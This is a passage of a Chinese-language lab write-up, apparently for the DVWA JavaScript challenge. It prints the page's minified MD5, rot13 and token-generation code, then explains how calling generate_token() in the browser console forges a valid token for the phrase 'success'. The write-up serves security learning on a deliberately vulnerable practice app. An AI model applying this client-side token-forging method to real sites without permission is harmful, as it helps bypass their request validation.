e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t>>>4&15)+"0123456789abcdef".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}"function"==typeof define&&define.amd?define(function(){return A}):"object"==typeof module&&module.exports?module.exports=A:n.md5=A}(this);

	function rot13(inp) {
		return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
	}

	function generate_token() {
		var phrase = document.getElementById("phrase").value;
		document.getElementById("token").value = md5(rot13(phrase));
	}

	generate_token();
</script>
EOF;
?>
```

分析页面[源码](https://so.csdn.net/so/search?q=源码&spm=1001.2101.3001.7020)发现，首先他用的是dom语法这是在前端使用的和后端无关，然后他是获取属性为phrase的值然后来个rot13和MD5双重加密在复制给token属性

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608092317452.png" alt="image-20220608092317452" style="zoom:80%;" />

直接注入 “success”，网页显示 token 无效，说明我们不能够直接注入。

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608091956025.png" alt="image-20220608091956025" style="zoom:80%;" />

抓包看看，请求网页时同时提交了 token 和 phrase 参数，其中 phrase 参数是我们提交的内容。而 token 参数无论我们提交什么，都是不会变的，也就是说 token 和我们注入的参数并不会匹配。

![image-20220608092025611](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608092025611.png)

查看前端代码果然有dom语法，发现要获取和要赋值的都有了默认值，所以提交的虽然是success但是token还是changeme的因为generate_token()方法不会自动执行他需要调用，这时只需要在前端调用generate_token()方法生成相应token就行

![image-20220608092445395](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608092445395.png)

生成success的token，发现提交成功

![image-20220608093024145](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220608093024145.png)